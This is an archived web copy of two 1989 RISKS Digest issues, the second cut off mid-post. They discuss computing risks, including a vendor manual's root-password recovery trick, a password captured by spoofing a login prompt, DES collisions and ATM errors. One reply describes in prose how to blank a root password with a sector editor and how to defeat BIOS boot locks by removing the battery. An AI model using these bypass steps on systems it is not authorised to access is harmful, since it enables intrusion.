    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  `User friendliness' tradeoffs can lead to total nonsecurity 
</A>
<DD>
<A HREF="#subj1.1">
Eric S. Raymond
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Capturing a password 
</A>
<DD>
<A HREF="#subj2.1">
Phil Karn
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Collisions in DES 
</A>
<DD>
<A HREF="#subj3.1">
Jean-Jac. Quisquater
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: Crashing a PDP-11/40 [static electricity] 
</A>
<DD>
<A HREF="#subj4.1">
Jeffrey Mogul
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  ATM error 
</A>
<DD>
<A HREF="#subj5.1">
Douglas Jones
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Anecdotes: ping-pong robot; CCC breaks net 
</A>
<DD>
<A HREF="#subj6.1">
Konrad Neuwirth
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Request for information:  Health Hazards of Office Laser Printers    
</A>
<DD>
<A HREF="#subj7.1">
Keith Dancey
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Re: Structured Programming 
</A>
<DD>
<A HREF="#subj8.1">
Michael J. Chinni
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
 `User friendliness' tradeoffs can lead to total nonsecurity
</A>
</H3>
<address>
Eric S. Raymond
&lt;<A HREF="mailto:eric@snark.uu.net ">
eric@snark.uu.net 
</A>&gt;
</address>
<i>
1 Feb 89 20:48:42 GMT
</i><PRE>

What would you say about a UNIX box vendor that included a section entitled
`How to crack into root privileges on this machine' in their manuals? Not
much that's printable? Read on...

Yesterday morning my evaluation T5100 arrived from the good people at Toshiba
America, their loan to my HyperNews project (it will be the field remote-test
machine). I had great playing with this sleek little machine, assembling
hardware and installing software and generally admiring the Neatness Of It
All. Finally, a true portable capable enough to run a real operating system!

Installation was easy; the documentation took pains to make the system and
its setup procedures accessible to people who hadn't necessarily seen a UNIX
before. Someone had obviously worked overtime on the `user friendliness'
factor. I was impressed.

Between that and my own level of who-needs-the-manuals UNIX expertise it wasn't
till this morning that I cracked the "T/PIX System Administrator's Guide",
flipped through the Table of Contents and got a rude shock. There, staring
up at me, was printed "Procedure 1.5: Forgotten Root Password Recovery"

"Ai yi yi!" I thought, and flipped hurriedly to the section. Sure 'nuf,
it was a blow-by-blow description of how to do the boot-mount-and-edit trick
every guru on a UNIX system with bootable floppies knows how to set up but
seldom talks about -- and to make the trick easy the Toshiba people had
helpfully supplied a microfloppy already built to do it with!

I wonder how much the Toshiba people thought about what they're doing. In their
worthy concern with making it easier for novice administrators to recover from
dumb errors without calling in an expert, they've broadcast a procedure that
allows anyone who can get a copy of the tool disk and remember a few simple
instructions to crack *any* T5100 they can get physical access to. And since
these machines are portables it is unlikely they'll get much site protection.

If I needed one, this would have made a perfect and pointed reminder of the
opposition between convenience and security, and the risks of designing for
user-friendliness at all costs. As desktop and portable UNIX systems designed
for serious and potentially sensitive work proliferate, I wonder how many
vendors will make this kind of choice; how many others will leave that hole
open though undocumented because "that's the way it's *always* been done"; and
how many innocent users will become cracking victims for these reasons.

      Eric S. Raymond                     (the mad mastermind of TMN-Netnews)
      Email: eric@snark.uu.net                       CompuServe: [72037,2306]
      Post: 22 S. Warren Avenue, Malvern, PA 19355      Phone: (215)-296-5718

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Capturing a password (Re: <A HREF="/Risks/8.18.html">RISKS-8.18</A>)
</A>
</H3>
<address>
Phil Karn
&lt;<A HREF="mailto:karn@ka9q.bellcore.com ">
karn@ka9q.bellcore.com 
</A>&gt;
</address>
<i>
Thu, 2 Feb 89 00:22:09 EST
</i><PRE>

I once passed a REVERSE "Turing test". Back at Bell Labs in the early 1980s,
we used a large PBX for terminal networking.  Everyone had two phones on
their desk: one for voice and another (with 212 modem) for data.

Late one night, my office-mate's data phone rang a few times and stopped.
Thinking that someone had put the wrong number into their UUCP database, I set
up a terminal and waited for the retry to see if I could spoof the UUCP login
procedure and figure out the system responsible. Sure enough, a minute later
the second call came. I typed "login: ". To my surprise, a human responded by
typing her login name! "Hoookaaaay, let's try this," I muttered as I typed
"Password: " The person obediently typed her password! After a few seconds I
revealed who I was.  Click. No more annoying calls.
                                                              Phil

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Collisions in DES
</A>
</H3>
<address>
Jean-Jac. Quisquater) &lt; quisquat@prlb2.UUCP 
&lt;<A HREF="mailto:jjq@prlb2.UUCP ">
jjq@prlb2.UUCP 
</A>&gt;
</address>
<i>
5 Feb 89 11:00:28 GMT
</i><PRE>
Organization: Philips Research Laboratory, Brussels

To avoid any incorrect rumor, here is the complete announcement:

We (Jean-Paul Delescaille and Jean-Jacques Quisquater) were able to find 3
collisions in DES using a network of workstations during some weeks.

Definition of a collision: given a message M and an cryptographic algorithm f
with 2 parameters M and K (the key), a collision is a pair (K1, K2) such that

  f (M, K1) = f (M, K2),

that is, for a fixed message M and using a cryptographic algorithm f, the key
K1 and the key K2 give the SAME encrypted message.

Jean-Jacques devised a new probabilistic distributed asynchronous algorithm for
finding collisions without any sorting and with a small storage (a la Pollard).
We used a fast implementation of DES in C (by Jean-Paul: about 2000 *
(encryption + change of key) / second/machine)

We used the idle time of a network of 20 SUN-3's and 10 microVAXes 
(a la Lenstra and Manasse). Total: about 100 Mips during one month.

 37
2  encryptions performed (about 20 potential collisions) only in software!

The message M is 0404040404040404 (hexadecimal form) for the 3 collisions.

Collision 1: found Fri Jan 13 23:15 GMT (birthday of Jean-Jacques!
Yes, it is another birthday attack (Hi! Don Coppersmith)).

   cipher = F02D67223CEAF91C
   K1     = 4A5AA8D0BA30585A
   K2     = suspense!

Collision 2: found Fri Jan 20 19:13 GMT

   cipher = E20332821871EB8F
   K1, K2 = suspense!

Collision 3; found Fri Feb  3 03:22 GMT

   suspense!

Conclusion: Friday is a good day for finding collisions :-)

Well, there is a problem because there is no proof we effectively found such
collisions.

Question 1: Find a protocol for proving or for convincing you that we know K2
for collision 1 (zero-knowledge protocols are useful in this context).

Question 2: Find a protocol for proving or convincing that we know
K1 and K2 for collision 2 (idem).

Question 3: Find a protocol for proving or convincing that we know
3 different collisions (idem).


Useful information: the nice paper by Brassard, Chaum and Crepeau,
``Minimum disclosure proofs of knowledge'', 1987.

The complete information will be given at EUROCRYPT '89, Houthalen, 
Belgium, with the restriction that the submitted abstract is
accepted :-) The paper will be sent in April if you want it.

Thanks are due to Paul Branquart, Frans Heymans, Michel Lacroix, Vincent
Marlair, Marc Vauclair, the members of PRLB for permission and active help in
the effective implementation of the distributed algorithm on their workstations.

Warning: There is no implication about the security of DES used for encryption.
Indeed these experiments only prove that DES is a good random mapping (a
necessary property for any cryptographic algorithm). However the use of DES for
protecting the integrity of files is not very easy and needs very careful
studies.

Jean-Jacques Quisquater                    (Program chairman of EUROCRYPT '89)

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: Crashing a PDP-11/40 [static electricity]
</A>
</H3>
<address>
Jeffrey Mogul
&lt;<A HREF="mailto:mogul@decwrl.dec.com ">
mogul@decwrl.dec.com 
</A>&gt;
</address>
<i>
31 Jan 1989 1101-PST (Tuesday)
</i><PRE>

In RISKS 8.18, Jeff Makey writes about a PDP-11/40 that could be
crashed by walking across the room and kicking the console terminal,
thereby transferring a static charge to the console and the CPU.

I can confirm this feature of PDP-11/40s.  When I was in high school,
around 15 years ago, we had a PDP-11/40 (it's hard to believe that this
machine, with 56Kbytes of RAM and a few Mbytes of disk, could serve 8
simultaneous users).  I used to use the console occasionally, and found
that when I was wearing a sweater knitted from acrylic wool I had to be
careful not to let my arms rub on the case of the terminal.

We also had to go around the terminal room every few hours and spray
some sort of anti-static mist over the ASR33s.  I don't know if this
really worked, or if we just had a placebo effect.

If a PC were this sensitive to static, typewriters would still be big sellers.
It was extremely unpleasant to have to reboot every few hours on a dry winter's
day.  I still remember the sound made when I typed at a full-duplex ASR33 just
after the computer stopped echoing.
                                               -Jeff Mogul

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
ATM error
</A>
</H3>
<address>
Douglas Jones 
&lt;<A HREF="mailto:jones@herky.cs.uiowa.edu">
jones@herky.cs.uiowa.edu
</A>&gt;
</address>
<i>
Wed, 1 Feb 89 16:18:39 CST
</i><PRE>

I just had a run-in with an ATM that makes me wonder about the quality of
programs (or is it programmers) used in the banking industry.

I went through the normal sequence, putting in my card, entering my PIN,
and pressing the "FAST CASH, $25" button.

It came back with the error message:  "THE AMOUNT YOU REQUESTED IS NOT
DIVISIBLE BY $5.00."  Then it gave me the option of entering a new
amount or aborting the transaction.

I tried $50.00, $40.00, and $5.00, and got the same result each time.  I'd
bet the machine was out of money, but if this is the case, the error message
suggests incredibly ineptly written code.

Of course, a hardware error could add or drop a bit in a key storage location
to make it think I'd asked for an odd amount, but such errors are rare
enough that I wouldn't bet on it.

Oh yes, the ATM was relatively new, made by NCR, and at a very heavily used
location.
                        Douglas W. Jones, University of Iowa.

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Anecdotes: ping-pong robot; CCC breaks net 
</A>
</H3>
<address>
Konrad Neuwirth 
&lt;<A HREF="mailto:A4422DAE@AWIUNI11.BITNET">
A4422DAE@AWIUNI11.BITNET
</A>&gt;
</address>
<i>
Sun, 05 Feb 89 18:34:19 MEZ
</i><PRE>

There is a nice(? find out for yourself) story about a Ping-Pong robot built at
MIT. Now the guys who had built that machine were very proud of the device and
wanted to show it to Mr. Minsky.  First they explained to him how they built
it, and made it recognize round objects with a certain amount of reflecting
light, for what they had installed some lights, too. Now they turned on the
lights, and started the software. One fact is important: mr. minsky is bald.
They started the software, and he stand in front of the robot, directly in the
lights..

****T H A N G*****, and the robot hit the "ping pong ball".

The other one is about a German group of hackers (the CCC, Chaos Computer
Club) breaking into a net. First about the net: it is called BTX
(BildSchirmText = ScreenText) and is, well, sort of a mailbox system,
but really more one way, as the lines are 1200/75 baud. Now there are
some banks taking part in the system, too. And there are pages, which yu
have to pay for if you want to read them. Due to a security-leak, the CCC
found out the password of one of the big banks in the system. They set
up a page which you have to pay for, and made a computer (with the bank's
account) dial up that page again and again and again......
They had the software running for a whole night, and in the morning, had
130.000 DM on their account.

But that's not all: they had warned the german Bundespost, who runs the
BTX system, about the bug they had found in the system. The authities said
"we have a bug-free system". And imagine, they also said that directly
after the CCC had gone public with the hack! they said that the CCC must
have had spies in the bank.

-konrad

p.s.: the bug was reproduceable. About the pong story: you can find it
somewhere in Steven Levy's HACKERS book.

Konrad Neuwirth, Fernkorngasse 44/2/4, A-1100 Wien AUSTRIA
Phone : +43 / 222 /604 15 30

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">

</A>
</H3>
<address>
&lt;<A HREF="mailto:kgd@informatics.rutherford.ac.uk">
kgd@informatics.rutherford.ac.uk
</A>&gt;
</address>
<i>
Thu, 2 Feb 89 12:55:09 GMT
</i><PRE>
Subject: Request for information:  Health Hazards of Office Laser Printers

This is a request for information, or pointers to relevant sources of
information, on the hazards of Laser Printers.   I am more interested
in the chemical health hazards than, say, heat and noise which are
easy to appreciate.  In particular, what is the wisdom of sharing
office space without active ventilation with one or more Laser Printers?
 
I have a reference to arsenic compounds present on the drum, and a
widely held "view" that the toner is carcinogenic, but nothing
substantial and no authoritative source for the hazards these may pose.
 
I am also aware that erosion printers deposit light metals or other
unpleasant material in the atmosphere, but then I am not familiar
with this type of printer ever being used inside a permanently
occupied office.
 
Perhaps the relatively recent development of desk-top laser printers pose
a new hazard in those countries which do not habitually air-condition
their offices?
 
Keith Dancey,                               UUCP:   ..!mcvax!ukc!rlinf!kgd
Rutherford Appleton Laboratory,
Chilton, Didcot, Oxon  OX11 0QX             
                                        JANET:       K.DANCEY@uk.ac.rl.inf
Tel: (0235) 21900   ext 6756

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
 Re:  Structured Programming
</A>
</H3>
<address>
"Michael J. Chinni, SMCAR-CCS-E" 
&lt;<A HREF="mailto:mchinni@ARDEC.ARPA">
mchinni@ARDEC.ARPA
</A>&gt;
</address>
<i>
Thu, 2 Feb 89 10:47:32 EST
</i><PRE>

One "war story" I can relate is the following.  As an R&amp;D computer facility we
serve as what you might call a "job shop" for engineers at our site. One time
an engineer came to us with a several thousand line program that he wanted us
to put on our system (i.e. get it working).  After accepting the job we found
to our horror the the code was TOTALLY unstructured.  It had NO comments; had
no conection what-so-ever between variable names and their use; and frequently
used system-specific code without mentioning that it was system-specific OR
what the code did; and the entire program was replete with gotos.

It took us about 2 man-months of work to get that monstrosity working.
However, if the code had been "structured" it would have taken us no more that
2 man-weeks.

The moral of the story is that had the code been structured we would have saved
1.5 man-months of work. And since we charge by time spent on a job, it would
have saved much money.

Michael J. Chinni, US Army Armament Research, Development, and Engineering 
Center, Picatinny Arsenal, New Jersey  

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.20.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.22.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-72</DOCNO>
<DOCOLDNO>IA012-000131-B037-429</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.22.html 128.240.150.127 19970217025500 text/html 23596
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:53:27 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 22</TITLE>
<LINK REL="Prev" HREF="/Risks/8.21.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.23.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.21.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.23.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 22</H1>
<H2> Wednesday 8 February 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  B-1B bomber avionics problems 
</A>
<DD>
<A HREF="#subj1.1">
Jon Jacky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Risks of public terminal rooms 
</A>
<DD>
<A HREF="#subj2.1">
Roy Smith
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Using barcodes for road toll payments 
</A>
<DD>
<A HREF="#subj3.1">
Phillip Herring
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  ATM error - in Europe 
</A>
<DD>
<A HREF="#subj4.1">
John O'Connor
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Computing as a Discipline 
</A>
<DD>
<A HREF="#subj5.1">
Peter J. Denning
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Cryptic status displays, and GIGO 
</A>
<DD>
<A HREF="#subj6.1">
Mark Brader
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: `User friendliness' and forgotten root passwords     
</A>
<DD>
<A HREF="#subj7.1">
Shannon Nelson
</A><br>
<A HREF="#subj7.2">
 Ge' Weijers
</A><br>
<A HREF="#subj7.3">
 smv
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Health Hazards of Office Laser Printers 
</A>
<DD>
<A HREF="#subj8.1">
Hal Murray
</A><br>
<A HREF="#subj8.2">
 Jeffrey Mogul
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Re: Keycard badges vs. anti-shoplift systems 
</A>
<DD>
<A HREF="#subj9.1">
Craig Leres
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
B-1B bomber avionics problems
</A>
</H3>
<address>
jon@june.cs.washington.edu 
&lt;<A HREF="mailto: Jonathan Jacky, University of Washington ">
 Jonathan Jacky, University of Washington 
</A>&gt;
</address>
<i>
Mon, 06 Feb 89 19:59:21 PST
</i><PRE>

Here are excerpts from AVIATION WEEK 130(1) Jan 2 1989 pps. 101, 103:

ROCKWELL WORKING WITH AIL TO DEVELOP B-1B AVIONICS FIX  (no author)

Rockwell has more than two dozen engineers at AIL [an Eaton subsidiary] to work
on the ALQ-161 which is designed to detect, indentify and jam enemy radars. ...
The problem occurs when an aircraft flies at low altitude over a powerful radar
system.  The system radar produces harmonics in the warning receiver that
result in a large number of spurious signals overloading the ALQ-161 processor,
which tries to analyze them as though they were actual threat emissions ...
The fix essentially calls for screening out the spurious signals before they
are digitized and allowed to enter the system processor ...  Engineering work
could be accomplished for about $15 million.  The modified system could be
evaluated in a flight test by next fall or winter.  The $3.5 billion Air Force
contract for development of the ALQ-161 was by far AIL's largest contract to
date.  The Air Force, meanwhile, has decided to study another approach to the
problem which involves installation of an autonomous radar warning receiver in
addition to the ALQ-161.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
risks of public terminal rooms
</A>
</H3>
<address>
Roy Smith 
&lt;<A HREF="mailto:roy@phri.phri.nyu.edu">
roy@phri.phri.nyu.edu
</A>&gt;
</address>
<i>
Wed, 8 Feb 89 16:34:48 EST
</i><PRE>

Last week at USENIX, there was a public terminal room consisting of a bunch of
terminals on an ethernet terminal server, and a Sun-3/60 with a dial-up SLIP
line acting as an IP gateway to the rest of the world.  People were invited to
telnet to their home machines and read their mail (or whatever).  It occured to
me that if one was into such things, this would have been a golden opportunity
to set up an ethernet listener to capture hostname/username/password triples.
Given the high concentration of system administrators at USENIX, in the span of
5 days, one could have captured passwords for important accounts on most of the
major Unix machines in the country.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Using barcodes for road toll payments
</A>
</H3>
<address>
Phillip Herring
&lt;<A HREF="mailto:ph@uowcsa.oz.au ">
ph@uowcsa.oz.au 
</A>&gt;
</address>
<i>
Tue, 7 Feb 89 16:10:44 EDT
</i><PRE>

(From "The Australian"'s Computer section, Feb 7th, p. 55:)

"Barcodes, now in common use for identifying anything from cornflakes
and library books to beer barrels, could also be the answer to
speeding up the flow of traffic over Sydney's harbour bridge.

"Stickers carrying the barcode for the particular week or month could
be sold at railway stations, lottery agencies or through the mail.

"These would be stuck to the side window of vehicles where they could
be read by long-distance scanners at existing bridge checkpoints.[...]

"[A company representative] said the use of such technology on the bridge
would enable vehicles to pass straight through if they were carrying
the right barcode markings.

"If there were no sticker or the code was out of date, the normal
default camera would be activated."

(From the second paragraph, it seems that everyone would get the
same barcode for a given period. At $1.50 (Aust.) per crossing, the
new (manual) monthly passes will be worth a lot of money. With the
Barcode system, anyone with a good printer and barcode-generating
software would be in a good position to clean up with fake barcodes.)

Rev. Dr. Phil Herring,		              University of Wollongong

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
ATM error - in Europe
</A>
</H3>
<address>
John O'Connor EuroKom 
&lt;<A HREF="mailto:JOCONNOR@vms.eurokom.ie">
JOCONNOR@vms.eurokom.ie
</A>&gt;
</address>
<i>
Mon, 6 Feb 89 12:40 GMT
</i><PRE>

Recently when I was in Germany on holidays I used my Eurocheque card (once) to
withdraw money from an ATM there - the ATM gave me no script of the transaction
incidentally. It took about 3 weeks for the transaction to reach my account in
Ireland. Fine - I saw it come in on the statement and marked it off against my
records. Then 2 weeks later 2 more debits for the same amount came in. I
checked my records before approaching my bank query the transaction. I was told
that they would have to check back with the bank in Germany and examine its
hardcopy audit of transactions etc. etc. and it could take 3 months for the
amount to be refunded. The teller did however check with the international ATM
office for the bank to discover that in the central clearing house in Brussels
the German transaction tape had been mounted 3 times instead of once - causing
chaos. The first erroneous transaction was corrected a few days later but it
took more than a month to correct the second. My bank manager took a
sympathetic view of my case and refunded the sum immediately, pending a
correction from Brussels.

A few points in this case:

1. I find it unbelievable that this sort of error could happen in
a major financial banking centre - any other similar reports ?

2. My colleages said that they would not have spotted the error so
quickly (or at all) - too much trust in bank statements.

3. In the event of a dispute it was a case of my word against
theirs - I had no proof that I had NOT withdrawn the money.

John O'Connor, Systems Support, EuroKom, University College Dublin,  Dublin 4,
Ireland.

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Computing as a Discipline 
</A>
</H3>
<address>
Peter J. Denning 
&lt;<A HREF="mailto:pjd@riacs.edu">
pjd@riacs.edu
</A>&gt;
</address>
<i>
Wed, 8 Feb 89 13:21:53 pst
</i><PRE>

A recent item in RISKS (Engineering vs. Programming, by Lynn R. Grant, in
<A HREF="/Risks/8.20.html">RISKS-8.20</A>) about distinctions between engineering and programming prompts me
to invite RISKSers to read the report, "Computing as a Discipline," by the ACM
Task Force on the Core of Computer Science.  It is published in the January
CACM and a condensed version on the February COMPUTER.  It discusses these
distinctions and more.  The authors are Peter Denning (chairman), Doug Comer,
David Gries, Michael Mulder, Allen Tucker, Joe Turner, and Paul Young.

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
cryptic status displays, and GIGO
</A>
</H3>
<address>
Mark Brader 
&lt;<A HREF="mailto:msb@sq.sq.com">
msb@sq.sq.com
</A>&gt;
</address>
<i>
Tue, 7 Feb 89 18:57:01 EST
</i><PRE>

SoftQuad is one of the many companies that have decided lately that
getting a FAX machine was a good idea.  The one that we got supports
delayed-start transmission to take advantage of overnight phone rates.

Last night, one of our managers left the machine set to send a document
at 4:05 am to the 32nd phone number in the machine's memory, and went home.

And another employee came along, saw "D.XMT 0405#32" on the status display,
decided this must be an error code, and helpfully removed the document from
the feeder to try to clear the problem.

I asked the victim if it was okay to send this to Risks.  He replied:

  While you're at it you might comment on the highly confidential FAX I had
  to send some time ago.  So confidential in fact that the recipient had to
  go to remove the FAX from the machine the moment it arrived so that no
  one would see it.  Some time later, I got a puzzled call complaining that
  the FAX hadn't arrived.

  I'd been so careful about making sure it was sent correctly, I'd put it in
  the machine wrong side down ...

Mark Brader, SoftQuad Inc., Toronto                  utzoo!sq!msb, msb@sq.com

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: `User friendliness' and forgotten root passwords (<A HREF="/Risks/8.21.html">RISKS-8.21</A>)
</A>
</H3>
<address>
Shannon Nelson 
&lt;<A HREF="mailto:shannon@intelisc.intel.com">
shannon@intelisc.intel.com
</A>&gt;
</address>
<i>
Tue, 7 Feb 89 00:19:11 pst
</i><PRE>

Don't be so shocked.  That's taken directly out of the manuals from AT&amp;T.
My copy is the Prentice Hall publication _UNIX(r)_System_V/386_
_System_Administrator's_Guide_ for Systam V Release 3.0.  Procedure 1.5 is
indeed the procedure for "recovering" a forgotten root password.  Actually,
it's for replacing /etc/passwd with the original default file.  The fact
that you wipe out all of your account information is not mentioned.  Also,
the boot floppy that you are to use is meant for installing a new release,
and automatically starts the process once UNIX is running.  The procedure
doesn't mention how to get out of that program and get a shell prompt.
(Just hit the interrupt key at the first question)

Before attempting the procedure, I suggest making a copy of /etc/passwd.

</PRE>
<HR><H3><A NAME="subj7.2">
Re: `User friendliness' and forgotten root passwords (<A HREF="/Risks/8.21.html">RISKS-8.21</A>)
</A>
</H3>
<address>
Ge Weijers
&lt;<A HREF="mailto:ge@phoibos.cs.kun.nl ">
ge@phoibos.cs.kun.nl 
</A>&gt;
</address>
<i>
7 Feb 89 09:36:34 GMT
</i><PRE>

There is no real protection against breaking into a system if you have physical
access to it, IF it does not have any features that make booting from a random
floppy impossible. Even without the boot disk it is quite easy to find the
password file with a sector editor. One could boot the T5100 and run MS-DOS
with the Norton Utilities or whatever to search for "root:" and change
the password field to empty (making a hole in the 'gcos' field).
Reboot Unix and type 'root'. No password check.

Who needs bootable Unix floppies?  Some AT-clones have a feature which prevents
bootstrapping from a floppy if switched on. A flag is stored in the clock chip.
This 'feature' can easily be defeated by disconnecting the backup battery.
(this is also true for BIOS-based password checks)

Systems containing sensitive data should not be physically accessible.

Ge' Weijers, KUN Nijmegen, the Netherlands
    UUCP: ge@cs.kun.nl -or- uunet.uu.net!kunivv1.uucp!phoibos!ge

</PRE>
<HR><H3><A NAME="subj7.3">
Re: `User friendliness' tradeoffs can lead to total nonsecurity
</A>
</H3>
<address>
&lt;<A HREF="mailto:smv@apollo.com">
smv@apollo.com
</A>&gt;
</address>
<i>
Tue, 7 Feb 89 18:31:32 EST
</i><PRE>

eric@snark.uu.net (Eric S. Raymond) writes in risks 8.21:
&gt; And since
&gt; these machines are portables it is unlikely they'll get much site protection.

I would expect a portable would be more closely attended than your average VAX.
Most VAXen aren't at serious risk of being stolen while you get a cup of coffee.
Also, most VAXen won't fit in an office safe, the Toshiba will.  For the truly
paranoid, there's always the large safe-deposit boxes at the bank, talk about
secure computing! Even gets you mandatory signature checking at login. :-)

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Health Hazards of Office Laser Printers
</A>
</H3>
<address>
Hal Murray
&lt;<A HREF="mailto:murray@src.dec.com ">
murray@src.dec.com 
</A>&gt;
</address>
<i>
Mon, 6 Feb 89 22:43:43 PST
</i><PRE>

I used to work for Xerox, so I may be biased. I'm interested in that
area, but not an expert.

You should be able to get that sort of info from the manfacturers. Your local
salesman may not be very helpful, but there is probably a corporate health or
safety officer that worries about that sort of thing. He will probably be happy
to send you copies of the reports that they have already filed with the
government to certify that they meet all the rules. Try writing to the
corporate headquarters.

I've seen the report sheet for the toner used in an LPS-40. It's not very
interesting. If you can't get anything like it, I can probably send you a
copy. I saw a similar one while I was at Xerox. It was equally dull.

Toner is almost inert. It's basically carbon black and ground up plastic.
They stuff lots of it into rats trying to see if it does anything nasty.

I think the laser is powerful enough to be a problem if you look directly
into it, but it is packaged inside a box ...

Yes, arsenic is an interesting chemical to use in a drum. I'm not sure what is
acutally used these days. Things like arsnic are not usually very toxic until
they get turned into a soluable compound. Copper and lead are toxic, but most
